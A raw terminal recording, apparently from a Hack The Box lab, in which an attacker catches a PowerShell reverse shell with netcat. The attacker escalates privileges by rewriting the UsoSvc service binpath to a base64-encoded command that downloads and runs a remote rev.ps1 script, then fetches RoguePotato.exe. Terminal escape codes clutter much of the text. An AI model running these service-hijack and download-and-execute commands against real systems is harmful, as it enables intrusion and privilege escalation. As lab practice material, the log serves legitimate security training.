@@ -1,0 +1,135 @@
+Script started on 2021-07-30 19:28:08-04:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="117" LINES="26"]
+                                                                                                                     ]0;root@kali: /htb/boxes/remote[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[32mr[39m[38;2;153;153;153mmdir privilege-escalation-awesome-suite-scripts[39m[47D[1m[31mr[1m[31ml[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [46D[1m[31mr[1m[31ml[1m[31mw[0m[39m[1m[31mw[1m[31mr[0m[39m[1m[31mr[1m[31ma[0m[39m[0m[32mr[0m[32ml[0m[32mw[0m[32mr[0m[32ma[32mp[39m nc [35m-[39m[35m-[35ml[39m[35ml[35mv[39m[35mv[35mn[39m[35mn[35mp[39m 9001[?1l>[?2004l
+listening on [any] 9001 ...
+[Kconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.180] 49712
+[KWindows PowerShell running as user REMOTE$ on REMOTE
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+[KPS C:\windows\system32\inetsrv>[KPS C:\windows\system32\inetsrv>[K[?2004hPS C:\windows\system32\inetsrv>cd \users\public\documents[?2004l[Kcd \users\public\documents
+[KPS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> dir[?2004l[Kdir
+[K
+
+    Directory: C:\users\public\documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        7/30/2021   7:11 PM        1919488 winPeasx64.exe                                                        
+
+
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe config binpath=-[K"cmd/[K /c[1@ [1P[1@ [C[C[C[C[C[C[C powershell [K.exe -EncodedCommand 6~[K[K[7mSQBFAFgAKAAgAEkAVwBSACAAa[27m[7mA[27m[7mB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAG[27m[7mk[27m[7mAbgBnACkACgA[27m[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CSQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cdir[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CSQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGk[1PAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
+[KDESCRIPTION:
+        Modifies a service entry in the registry and Service Database.
+USAGE:
+        sc <server> config [service name] <option1> <option2>...
+
+OPTIONS:
+NOTE: The option name includes the equal sign.
+      A space is required between the equal sign and the value.
+      To remove the dependency, use a single / as dependency value.
+ type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
+ start= <boot|system|auto|demand|disabled|delayed-auto>
+ error= <normal|severe|critical|ignore>
+ binPath= <BinaryPathName to the .exe file>
+ group= <LoadOrderGroup>
+ tag= <yes|no>
+ depend= <Dependencies(separated by / (forward slash))>
+ obj= <AccountName|ObjectName>
+ DisplayName= <display name>
+ password= <password>
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe stop UsoSvc[?2004l[Ksc.exe stop UsoSvc
+[K[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe stop UsoSvcconfig binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
+[KDESCRIPTION:
+        Modifies a service entry in the registry and Service Database.
+USAGE:
+        sc <server> config [service name] <option1> <option2>...
+
+OPTIONS:
+NOTE: The option name includes the equal sign.
+      A space is required between the equal sign and the value.
+      To remove the dependency, use a single / as dependency value.
+ type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
+ start= <boot|system|auto|demand|disabled|delayed-auto>
+ error= <normal|severe|critical|ignore>
+ binPath= <BinaryPathName to the .exe file>
+ group= <LoadOrderGroup>
+ tag= <yes|no>
+ depend= <Dependencies(separated by / (forward slash))>
+ obj= <AccountName|ObjectName>
+ DisplayName= <display name>
+ password= <password>
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
+[KDESCRIPTION:
+        Modifies a service entry in the registry and Service Database.
+USAGE:
+        sc <server> config [service name] <option1> <option2>...
+
+OPTIONS:
+NOTE: The option name includes the equal sign.
+      A space is required between the equal sign and the value.
+      To remove the dependency, use a single / as dependency value.
+ type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
+ start= <boot|system|auto|demand|disabled|delayed-auto>
+ error= <normal|severe|critical|ignore>
+ binPath= <BinaryPathName to the .exe file>
+ group= <LoadOrderGroup>
+ tag= <yes|no>
+ depend= <Dependencies(separated by / (forward slash))>
+ obj= <AccountName|ObjectName>
+ DisplayName= <display name>
+ password= <password>
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe config binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K config bin[K[K[KUsoSvc binpath= "[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksc.exe stop UsoSvc[?2004l[Ksc.exe stop UsoSvc
+[K[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe stop UsoSvcconfig binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CU binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Co binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSAC[CAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CS binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cv binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc.exe config UsoSvc binpath= "cmd /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
+[K[SC] ChangeServiceConfig SUCCESS
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> sc.exe start UsoSvc[?2004l[Ksc.exe start UsoSvc
+[K[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+PS C:\users\public\documents> [KPS C:\users\public\documents> [K[?2004hPS C:\users\public\documents> iwr http://10.10.14.2:8000/RoguePotatoe[K.exe -o Roguepotat[K[K[K[K[KPotato.exe[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[Kiwr http://10.10.14.2:8000/RoguePotato.exe -o RoguePotato.exe
+[K[K[?2004h[?2004l
+[K
+                                                                                                                     ]0;root@kali: /htb/boxes/remote
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[108C 1 [31m[1m[31m⨯[0m[31m[39m[112D[?1h=[?2004h[32mrlwrap[39m nc [35m-lvnp[39m 9001[20D[39m [39m [39m [39m [39m [39m     [39m [39m [39m [39m [39m      [20D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[109C 1 [31m[1m[31m⨯[0m[31m[39m[113D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[112C 1 [31m[1m[31m⨯[0m[31m[39m[116D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[119C 1 [31m[1m[31m⨯[0m[31m[39m[123D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[122C 1 [31m[1m[31m⨯[0m[31m[39m[126D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[130C 1 [31m[1m[31m⨯[0m[31m[39m[134D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[142C 1 [31m[1m[31m⨯[0m[31m[39m[146D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[149C 1 [31m[1m[31m⨯[0m[31m[39m[153D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[157C 1 [31m[1m[31m⨯[0m[31m[39m[161D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[162C 1 [31m[1m[31m⨯[0m[31m[39m[166D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[163C 1 [31m[1m[31m⨯[0m[31m[39m[167D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[164C 1 [31m[1m[31m⨯[0m[31m[39m[168D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[163C 1 [31m[1m[31m⨯[0m[31m[39m[167D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[160C 1 [31m[1m[31m⨯[0m[31m[39m[164D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[159C 1 [31m[1m[31m⨯[0m[31m[39m[163D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[158C 1 [31m[1m[31m⨯[0m[31m[39m[162D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[157C 1 [31m[1m[31m⨯[0m[31m[39m[161D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[156C 1 [31m[1m[31m⨯[0m[31m[39m[160D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[154C 1 [31m[1m[31m⨯[0m[31m[39m[158D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[153C 1 [31m[1m[31m⨯[0m[31m[39m[157D[A[0m[27m[24m[J[34m┌──([1m[34m[31mroot💀kali[0m[31m[34m)-[[1m[34m[39m/htb/boxes/remote[0m[34m]
+└─[1m[34m[31m#[0m[31m[
